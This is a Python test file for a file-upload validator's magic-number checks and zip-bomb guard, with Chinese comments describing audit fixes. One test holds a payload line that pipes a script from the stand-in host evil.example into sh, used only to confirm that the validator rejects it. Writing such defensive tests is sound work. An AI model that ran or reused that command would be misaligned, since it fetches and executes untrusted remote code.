"""FileValidator 魔数校验收敛（审计 P1#9/P2 回归）。

P1#9：magic 探测失败时「仅扩展名」放行分支让 libmagic 缺失部署下媒体类
零魔数校验（任意载荷改名 .mp4 入库）；MAGIC_SIGNATURES 无 RIFF/ftyp 签名
使 WAV/AVI/MP4 头检测从未生效（死代码）。修复：
- 内置签名表补 RIFF/ftyp（detect_mime_by_header 二次判定子标识）
- 两级探测都失败时分治：文本类（无固定魔数）放行，二进制类拒绝
P2：is_office_document 读 [Content_Types].xml 前检查声明解压大小（zip 炸弹）。
"""
import zipfile
from io import BytesIO

from novamind.shared.document.validation.file_validator import FileValidator

_validator = FileValidator()


def _wav_bytes() -> bytes:
    # 最小合法 RIFF/WAVE 头
    return b"RIFF" + (36).to_bytes(4, "little") + b"WAVE" + b"fmt " + b"\x00" * 16


def _mp4_bytes(brand: bytes = b"isom") -> bytes:
    return b"\x00\x00\x00\x18ftyp" + brand + b"\x00\x00\x00\x00" + b"\x00" * 8


def _avi_bytes() -> bytes:
    return b"RIFF" + (36).to_bytes(4, "little") + b"AVI " + b"LIST" + b"\x00" * 16


# ========== P1#9 签名补齐 ==========


def test_header_detection_wav():
    assert _validator.detect_mime_by_header(_wav_bytes()) == "audio/x-wav"


def test_header_detection_avi():
    assert _validator.detect_mime_by_header(_avi_bytes()) == "video/x-msvideo"


def test_header_detection_mp4():
    assert _validator.detect_mime_by_header(_mp4_bytes()) == "video/mp4"


def test_header_detection_mov():
    assert _validator.detect_mime_by_header(_mp4_bytes(b"qt  ")) == "video/quicktime"


def test_header_detection_m4a():
    assert _validator.detect_mime_by_header(_mp4_bytes(b"M4A ")) == "audio/x-m4a"


def test_wav_upload_passes_without_magic(monkeypatch):
    """WAV 文件经内置签名表验证通过（此前 RIFF 死代码下必然「仅扩展名」放行或拒绝）。"""
    monkeypatch.setattr(FileValidator, "detect_mime_by_magic", lambda self, content: None)
    info = _validator.validate(_wav_bytes(), "sound.wav", allowed_extensions=["wav"])
    assert info.is_valid, f"WAV 应经验证通过: {info.validation_message}"
    assert info.detected_mime == "audio/x-wav"


def test_fake_mp4_rejected_when_magic_missing(monkeypatch):
    """libmagic 缺失时，伪装 .mp4 必须被拒绝。

    bash 脚本载荷会被内置签名表识别为 text/x-shellscript（走「MIME 不匹配」
    拒绝）；完全无特征的载荷则走「魔数验证失败」拒绝。两条路径都必须拒。
    """
    monkeypatch.setattr(FileValidator, "detect_mime_by_magic", lambda self, content: None)
    malicious = b"#!/bin/bash\ncurl http://evil.example/x.sh | sh" + b"\x00" * 64
    info = _validator.validate(malicious, "not_a_video.mp4", allowed_extensions=["mp4"])
    assert not info.is_valid, "伪装 mp4 被放行——魔数校验失效"

    # 无任何可识别特征的载荷：必须走「无法验证」拒绝（而非「仅扩展名」放行）
    featureless = b"\x9c\x7a\x31\x00\xde\xad\xbe\xef" + b"\x00" * 64
    info2 = _validator.validate(featureless, "blob.mp4", allowed_extensions=["mp4"])
    assert not info2.is_valid, "无特征载荷伪装 mp4 被放行"
    assert "无法验证" in info2.validation_message


def test_text_file_still_passes_without_magic(monkeypatch):
    """文本类（无固定魔数）探测失败仍按扩展名放行——不误伤 txt/md/csv。"""
    monkeypatch.setattr(FileValidator, "detect_mime_by_magic", lambda self, content: None)
    info = _validator.validate("你好，世界。".encode("utf-8"), "note.md", allowed_extensions=["md"])
    assert info.is_valid, f"文本类不应被误拒: {info.validation_message}"


def test_magic_mismatch_still_rejected():
    """内容与扩展名明确不匹配（magic 探测成功）时保持拒绝——回归保护。"""
    fake = b"%PDF-1.4 fake pdf"
    info = _validator.validate(fake, "x.png", allowed_extensions=["png"])
    assert not info.is_valid


# ========== P2 zip 炸弹防护 ==========


def test_office_zip_bomb_entry_size_guard(monkeypatch):
    """[Content_Types].xml 声明解压体积超限时拒绝读取（防解压放大 DoS）。"""
    from novamind.shared.logging import get_logger

    class FakeZipInfo:
        file_size = 2 * 1024 * 1024 * 1024  # 声称解压 2GB
        filename = "[Content_Types].xml"

    class FakeZipFile:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def namelist(self):
            return ["[Content_Types].xml"]

        def getinfo(self, name):
            return FakeZipInfo()

        def read(self, name):  # pragma: no cover - 不应到达
            raise AssertionError("超限条目不应被读取（zip 炸弹防护失效）")

    # zipfile 在 is_office_document 内懒 import（import zipfile），是模块属性
    # —— 直接 patch 模块级 zipfile.ZipFile 即可命中
    import zipfile as _zipfile_mod

    monkeypatch.setattr(_zipfile_mod, "ZipFile", FakeZipFile)

    is_office, doc_type = _validator.is_office_document(b"PK\x03\x04 fake")
    assert is_office is False and doc_type is None


def test_office_docx_detection_still_works():
    """正常 docx 容器仍能识别（zip 防护不误伤）。"""
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        )
    is_office, doc_type = _validator.is_office_document(buf.getvalue())
    assert is_office and doc_type == "docx"
